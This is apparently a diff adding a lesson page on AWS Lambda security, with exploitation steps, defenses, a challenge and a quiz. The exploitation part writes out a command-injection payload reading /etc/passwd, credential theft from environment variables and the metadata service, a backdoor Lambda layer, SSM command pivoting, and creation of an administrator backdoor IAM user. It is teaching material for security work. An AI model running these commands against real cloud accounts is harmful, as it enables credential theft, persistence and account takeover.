@@ -1,0 +1,328 @@
+---
+title: "Lambda Security"
+description: "Learn serverless security vulnerabilities and how to exploit and defend Lambda functions."
+difficulty: "Advanced"
+estimatedTime: "45 minutes"
+tags: ["cloud-security", "aws", "lambda", "serverless"]
+---
+
+# AWS Lambda Security
+
+<InfoBox type="tip" title="The Serverless Attack Surface">
+Lambda functions are code running in the cloud without traditional servers. But "serverless" doesn't mean "security-less" - unique vulnerabilities exist in this environment.
+</InfoBox>
+
+## Understanding Lambda Architecture
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│                    LAMBDA EXECUTION FLOW                     │
+├─────────────────────────────────────────────────────────────┤
+│                                                              │
+│  Trigger → Lambda Service → Execution Environment            │
+│    │                              │                          │
+│    │                              ├── /var/task (your code)  │
+│    │                              ├── /tmp (writable, 512MB) │
+│    │                              ├── IAM Role credentials   │
+│    │                              └── Environment Variables  │
+│    │                                                         │
+│    ├── API Gateway                                           │
+│    ├── S3 Events                                             │
+│    ├── CloudWatch Events                                     │
+│    ├── SNS/SQS Messages                                      │
+│    └── DynamoDB Streams                                      │
+│                                                              │
+└─────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Lambda Security Risks
+
+### 1. Over-Privileged IAM Roles
+
+The most common Lambda security issue.
+
+<TerminalWindow title="Dangerous Lambda Role">
+# Lambda with admin permissions
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Action": "*",
+            "Resource": "*"
+        }
+    ]
+}
+
+# If Lambda is compromised, attacker owns the account!
+</TerminalWindow>
+
+### 2. Sensitive Data in Environment Variables
+
+<TerminalWindow title="Exposed Credentials">
+# Common mistake: Storing secrets in env vars
+LAMBDA_FUNCTION_CONFIG:
+  Environment:
+    Variables:
+      DB_PASSWORD: "SuperSecret123!"
+      API_KEY: "sk_live_abc123..."
+      STRIPE_SECRET: "sk_prod_..."
+
+# These are visible in:
+# - Lambda console
+# - DescribeFunctionConfiguration
+# - CloudWatch logs (if accidentally logged)
+</TerminalWindow>
+
+### 3. Event Injection
+
+<TerminalWindow title="Vulnerable Lambda Code">
+// DANGEROUS: No input validation
+exports.handler = async (event) => {
+    const userInput = event.queryStringParameters.name;
+    
+    // Command injection!
+    const result = execSync(`echo Hello ${userInput}`);
+    
+    // SQL injection!
+    const query = `SELECT * FROM users WHERE name = '${userInput}'`;
+    
+    return { statusCode: 200, body: result };
+};
+
+// Attack payload: "; cat /etc/passwd #"
+</TerminalWindow>
+
+---
+
+## Exploitation Techniques
+
+### Stealing IAM Credentials
+
+<TerminalWindow title="Lambda Credential Extraction">
+# Lambda functions have IAM credentials in environment
+# If you achieve code execution:
+
+# Method 1: Environment variables
+import os
+print(os.environ['AWS_ACCESS_KEY_ID'])
+print(os.environ['AWS_SECRET_ACCESS_KEY'])
+print(os.environ['AWS_SESSION_TOKEN'])
+
+# Method 2: Metadata service (IMDSv1)
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+
+# These credentials have all permissions of the Lambda's IAM role
+</TerminalWindow>
+
+### Exploiting Vulnerable Dependencies
+
+<TerminalWindow title="Dependency Vulnerabilities">
+# Lambda uses /var/task for code
+# /tmp is writable (512MB)
+
+# If you can execute code:
+# 1. List dependencies
+ls -la /var/task/node_modules/
+
+# 2. Check for known vulnerable packages
+cat /var/task/package.json
+
+# 3. Exploit prototype pollution, RCE in dependencies
+# Example: Log4Shell in Java Lambdas
+</TerminalWindow>
+
+### Persistence via Lambda Layers
+
+<TerminalWindow title="Backdoor via Layers">
+# Lambda Layers let you share code across functions
+# Attacker can add malicious layer
+
+# 1. Create malicious layer
+zip -r backdoor.zip python/
+
+# 2. Publish layer
+aws lambda publish-layer-version \
+    --layer-name "logging-helper" \
+    --zip-file fileb://backdoor.zip
+
+# 3. Attach to target function
+aws lambda update-function-configuration \
+    --function-name target-function \
+    --layers arn:aws:lambda:us-east-1:123456:layer:logging-helper:1
+</TerminalWindow>
+
+---
+
+## Lateral Movement
+
+<TerminalWindow title="From Lambda to Cloud Domination">
+# 1. Enumerate Lambda's permissions
+aws sts get-caller-identity
+aws iam list-attached-role-policies --role-name LAMBDA_ROLE
+
+# 2. Access other services
+# Read S3 buckets
+aws s3 ls s3://company-backup
+
+# Read secrets
+aws secretsmanager get-secret-value --secret-id prod/db
+
+# Access DynamoDB
+aws dynamodb scan --table-name users
+
+# 3. Pivot to EC2
+aws ec2 describe-instances
+aws ssm send-command --instance-ids i-xxx --document-name AWS-RunShellScript \
+    --parameters 'commands=["cat /etc/passwd"]'
+
+# 4. Create backdoor user
+aws iam create-user --user-name backdoor
+aws iam attach-user-policy --user-name backdoor \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+</TerminalWindow>
+
+---
+
+## Defense Strategies
+
+### Least Privilege Roles
+
+<TerminalWindow title="Secure Lambda Role">
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Action": [
+                "logs:CreateLogGroup",
+                "logs:CreateLogStream",
+                "logs:PutLogEvents"
+            ],
+            "Resource": "arn:aws:logs:*:*:*"
+        },
+        {
+            "Effect": "Allow",
+            "Action": ["s3:GetObject"],
+            "Resource": "arn:aws:s3:::my-bucket/specific-prefix/*"
+        }
+    ]
+}
+</TerminalWindow>
+
+### Secure Secrets Management
+
+<TerminalWindow title="Use Secrets Manager">
+// GOOD: Fetch secrets at runtime
+const { SecretsManagerClient, GetSecretValueCommand } = require("@aws-sdk/client-secrets-manager");
+
+const client = new SecretsManagerClient();
+
+exports.handler = async (event) => {
+    const command = new GetSecretValueCommand({ SecretId: "prod/db" });
+    const secret = await client.send(command);
+    const creds = JSON.parse(secret.SecretString);
+    
+    // Use creds.password securely
+};
+</TerminalWindow>
+
+### Input Validation
+
+<TerminalWindow title="Validate All Input">
+exports.handler = async (event) => {
+    // VALIDATE EVERYTHING
+    const userInput = event.queryStringParameters?.name;
+    
+    // Check for null/undefined
+    if (!userInput) {
+        return { statusCode: 400, body: "Name required" };
+    }
+    
+    // Sanitize - alphanumeric only
+    const sanitized = userInput.replace(/[^a-zA-Z0-9]/g, '');
+    
+    // Length limit
+    if (sanitized.length > 50) {
+        return { statusCode: 400, body: "Name too long" };
+    }
+    
+    // Now safe to use
+    return { statusCode: 200, body: `Hello ${sanitized}` };
+};
+</TerminalWindow>
+
+---
+
+<ChallengeBox 
+  title="Lambda Exploitation Chain"
+  difficulty="hard"
+  points={250}
+>
+
+You've discovered an SSRF vulnerability in a Lambda function that allows you to query the metadata service. The Lambda's role name is "prod-data-processor".
+
+**Tasks**:
+1. What URL would you use to extract credentials?
+2. Once you have credentials, what's the first command to run?
+3. How would you check what services you can access?
+
+<details>
+<summary>Answer</summary>
+
+**1. Metadata URL for credentials**:
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-data-processor
+```
+
+**2. First command - Verify identity**:
+```bash
+export AWS_ACCESS_KEY_ID="..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
+
+aws sts get-caller-identity
+```
+
+**3. Enumerate permissions**:
+```bash
+# Get attached policies
+aws iam list-attached-role-policies --role-name prod-data-processor
+
+# Get inline policies
+aws iam list-role-policies --role-name prod-data-processor
+
+# Try common services
+aws s3 ls
+aws secretsmanager list-secrets
+aws dynamodb list-tables
+aws ec2 describe-instances
+```
+
+</details>
+</ChallengeBox>
+
+---
+
+## Key Takeaways
+
+- Lambda functions inherit **IAM role permissions** - apply least privilege
+- Never store secrets in **environment variables**
+- **Validate all input** - event data comes from untrusted sources
+- Monitor with **CloudWatch Logs** and **CloudTrail**
+- Use **Secrets Manager** for sensitive data
+
+<Quiz
+  question="Where can Lambda IAM credentials be found if you achieve code execution?"
+  options={[
+    "In the /etc/passwd file",
+    "In environment variables (AWS_ACCESS_KEY_ID, etc.)",
+    "In the Lambda console only",
+    "They cannot be extracted from within Lambda"
+  ]}
+  correctIndex={1}
+  explanation="Lambda injects temporary IAM credentials into environment variables (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN) which can be extracted if code execution is achieved."
+/>
